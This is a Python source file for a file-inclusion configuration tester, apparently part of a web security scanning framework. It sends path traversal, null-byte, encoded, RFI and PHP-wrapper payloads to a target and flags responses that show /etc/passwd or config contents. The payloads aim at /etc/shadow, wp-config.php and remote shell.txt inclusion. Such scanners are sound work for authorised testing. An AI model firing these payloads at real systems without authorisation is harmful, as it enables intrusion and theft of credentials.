"""File inclusion configuration tester."""

from workers.config_mgmt.base_tool import ConfigMgmtTool
from workers.config_mgmt.concurrency import WeightClass


class FileInclusionTester(ConfigMgmtTool):
    """Test file inclusion configuration (WSTG-CONFIG-009)."""

    name = "file_inclusion_tester"

    def build_command(self, target, headers=None):
        target_url = getattr(target, 'target_value', str(target))
        base_url = target_url if target_url.startswith(('http://', 'https://')) else f"https://{target_url}"

        script = f'''
import httpx
import json

results = []
base_url = "{base_url}"

LFI_PATHS = [
    "/index.php?page=",
    "/index.php?file=",
    "/index.php?include=",
    "/index.php?load=",
    "/index.php?path=",
    "/index.php?doc=",
    "/index.php?template=",
    "/index.php?view=",
    "/index.php?content=",
    "/index.php?module=",
    "/index.php?inc=",
    "/index.php?pg=",
    "/page.php?page=",
    "/page.php?file=",
    "/page.php?include=",
    "/view.php?page=",
    "/view.php?file=",
    "/include.php?file=",
    "/main.php?page=",
    "/home.php?page=",
    "/default.php?page=",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/syslog",
    "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "..\\\\..\\\\..\\\\..\\\\boot.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
    "../../../../etc/passwd%00",
]

RFI_PAYLOADS = [
    "http://example.com/shell.txt?",
    "https://example.com/shell.txt?",
    "//example.com/shell.txt?",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "expect://id",
    "zip://test.zip%23shell.php",
]

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "root:",
    "daemon:",
    "BOOT.INI",
    "[boot loader]",
]

try:
    client = httpx.Client(follow_redirects=True, timeout=10, verify=False)
    base_path = base_url.rstrip('/')

    for path_template in LFI_PATHS:
        for payload in LFI_PAYLOADS[:5]:
            try:
                full_url = base_path + path_template + payload
                resp = client.get(full_url)
                if resp.status_code == 200:
                    body_lower = resp.text.lower()
                    for sensitive in SENSITIVE_FILES:
                        if sensitive.lower() in body_lower:
                            results.append({{
                                "vulnerability": {{
                                    "name": f"Local File Inclusion detected",
                                    "severity": "critical",
                                    "description": f"LFI vulnerability found: {{path_template}} accepts {{payload}} and returns sensitive content",
                                    "location": full_url
                                }}
                            }})
                            break
                    if "root:" in resp.text or "daemon:" in resp.text:
                        results.append({{
                            "vulnerability": {{
                                "name": "LFI - /etc/passwd readable",
                                "severity": "critical",
                                "description": f"File inclusion allows reading /etc/passwd via {{path_template}}",
                                "location": full_url
                            }}
                        }})
            except Exception:
                pass

    for path_template in LFI_PATHS[:5]:
        for payload in RFI_PAYLOADS[:4]:
            try:
                full_url = base_path + path_template + payload
                resp = client.get(full_url, follow_redirects=False)
                if resp.status_code == 200:
                    if "phpinfo" in resp.text.lower() or "PHP Version" in resp.text:
                        results.append({{
                            "vulnerability": {{
                                "name": "Remote File Inclusion / PHP wrapper bypass",
                                "severity": "critical",
                                "description": f"RFI or PHP wrapper bypass detected at {{path_template}} with payload {{payload[:50]}}",
                                "location": full_url
                            }}
                        }})
            except Exception:
                pass

    php_wrapper_payloads = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=wp-config.php",
    ]
    for path_template in LFI_PATHS[:3]:
        for payload in php_wrapper_payloads:
            try:
                full_url = base_path + path_template + payload
                resp = client.get(full_url)
                if resp.status_code == 200:
                    import base64
                    try:
                        decoded = base64.b64decode(resp.text).decode("utf-8", errors="ignore")
                        if any(kw in decoded.lower() for kw in ["password", "database", "config", "<?php"]):
                            results.append({{
                                "vulnerability": {{
                                    "name": "PHP wrapper bypass - sensitive file read",
                                    "severity": "critical",
                                    "description": f"PHP filter wrapper used to read sensitive file via {{path_template}}",
                                    "location": full_url
                                }}
                            }})
                    except Exception:
                        pass
            except Exception:
                pass

    client.close()

except Exception as e:
    results.append({{
        "observation": {{
            "type": "test_error",
            "value": str(e),
            "details": {{"error": str(e)}}
        }}
    }})

print(json.dumps(results))
'''
        return ["python3", "-c", script]

    def parse_output(self, stdout):
        import json
        try:
            return json.loads(stdout.strip())
        except (json.JSONDecodeError, ValueError):
            return []
